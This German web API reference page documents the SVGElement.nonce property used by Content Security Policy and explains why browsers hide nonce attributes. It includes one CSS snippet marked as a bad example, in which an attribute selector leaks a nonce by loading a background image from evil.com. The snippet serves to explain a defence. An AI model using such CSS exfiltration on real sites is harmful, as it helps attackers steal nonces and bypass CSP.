---
title: "SVGElement: nonce-Eigenschaft"
short-title: nonce
slug: Web/API/SVGElement/nonce
l10n:
  sourceCommit: dc788bf0ea36cb1ebe809c82aaae2c77cb3e18c0
---

{{APIRef("SVG")}}

Die **`nonce`**-Eigenschaft der [`SVGElement`](/de/docs/Web/API/SVGElement)-Schnittstelle gibt die {{Glossary("Nonce", "Nonce")}} zurück, die von der [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP) verwendet wird, um zu bestimmen, ob ein bestimmter Abruf durchgeführt werden darf.

## Wert

Ein Zeichenfolge; die kryptografische Nonce oder eine leere Zeichenfolge, wenn keine Nonce gesetzt ist.

## Beispiele

### Abrufen eines Nonce-Wertes

In der Vergangenheit unterstützten nicht alle Browser das `nonce` IDL-Attribut, daher ist eine Möglichkeit die Verwendung von [`getAttribute`](/de/docs/Web/API/Element/getAttribute) als Fallback:

```js
const svg = document.querySelector("svg");
const nonce = svg.nonce || svg.getAttribute("nonce");

// Modern browsers hide the nonce attribute from getAttribute()
console.log(nonce); // Prefer using `svg.nonce`
```

Allerdings verbergen neuere Browserversionen `nonce`-Werte, die auf diese Weise zugegriffen werden (es wird eine leere Zeichenfolge zurückgegeben). Die IDL-Eigenschaft (`svg['nonce']`) wird der einzige Weg sein, um Noncen zuzugreifen.

Das Verbergen von Noncen hilft, Angreifer daran zu hindern, Nonce-Daten über Mechanismen zu extrahieren, die Daten von Inhaltsattributen wie diesem CSS-Selektor erfassen können:

```css example-bad
svg[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`HTMLElement.nonce`](/de/docs/Web/API/HTMLElement/nonce) eine ähnliche Methode für HTML-Elemente.
- [`nonce` global attribute](/de/docs/Web/HTML/Reference/Global_attributes/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP)
- CSP: {{CSP("script-src")}}
